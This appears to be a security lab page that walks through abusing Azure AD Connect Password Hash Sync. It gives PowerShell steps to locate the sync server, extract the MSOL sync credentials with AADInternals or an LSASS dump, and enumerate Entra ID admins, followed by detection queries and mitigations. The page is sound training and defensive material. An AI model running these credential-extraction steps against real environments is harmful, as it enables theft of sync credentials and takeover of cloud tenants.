# Attack Scenario: Azure AD Connect Password Hash Sync Abuse
Azure AD Connect with Password Hash Synchronization (PHS) enables organizations to sync password hashes from on-prem Active Directory to Entra ID (Azure AD). If an attacker compromises the on-prem environment and gains access to the AAD Connect server, they can extract credentials and pivot into cloud infrastructure.

This is a hybrid domain takeover technique.

## MITRE ATT&CK Techniques:
- T1552.001 – Unsecured Credentials: Credentials in Files
- T1003.006 – OS Credential Dumping: DCSync
- T1087.004 – Account Discovery: Cloud Account

## Lab Environment
- **On-prem Domain:** internal.lab
- **Azure AD:** Connected tenant via AAD Connect
- **AAD Connect server with local admin access**
- **Admin credentials synced between AD and Azure**
- **Tools:** AADInternals, mimikatz, PowerShell

## Objectives
- Extract AAD Connect credentials
- Abuse MSOL account or admin token
- Enumerate or access Azure resources (e.g., Graph, Office 365, Entra ID)

## Execution Steps
### 1. Identify AAD Connect Server
From any privileged AD context:

```Get-ADComputer -Filter * | Where-Object { $_.Name -like "*AAD*" }```
Or:

```Get-ADUser -Filter * | Where-Object { $_.Name -like "*MSOL*" }```
### 2. Extract AAD Connect Credentials (local access)
Use mimikatz or AADInternals on the AAD Connect host:
```
Import-Module .\AADInternals.ps1
Get-AADIntSyncCredentials
```
Or manually dump the LSASS memory and parse the MSOL_ user password.

### 3. Use the MSOL Account for Cloud Access
Log in via PowerShell:
```
$creds = Get-Credential
Connect-MsolService -Credential $creds
```
Check privileges:
```
Get-MsolUser | Select-Object DisplayName, isLicensed
Get-MsolRoleMember -RoleObjectId (Get-MsolRole -RoleName "Company Administrator").ObjectId
```
Enumerate Entra ID:
```
Connect-AzAccount -Credential $creds
Get-AzUser
Get-AzRoleAssignment
```

## Detection Guidance
### Logs and Indicators
- Unusual MSOL or legacy account logins
- Entra ID logins from on-prem IPs or user agents like PowerShell or legacy clients
- Sudden admin role assignments or token refreshes

### KQL – Suspicious MSOL Logins

```
SigninLogs
| where UserPrincipalName contains "microsoft.online"
| where AppDisplayName == "PowerShell"
| where IPAddress !in (known IP ranges)
```
## Mitigations
- Do not use directory-wide admin accounts in sync scope
- Rotate MSOL_ passwords regularly
- Implement Azure AD Conditional Access with MFA
- Harden AAD Connect server (no internet, limited RDP, EDR coverage)

## References
- https://o365blog.com/aadinternals/
- https://dirkjanm.io/azuread-connect-for-redteam/
- https://attack.mitre.org/techniques/T1552/001/
- https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-hybrid-identity

## Navigation
[Back to Lab Index:](../../README.md)
[Next: Token Theft via Refresh Tokens](./token-theft.md)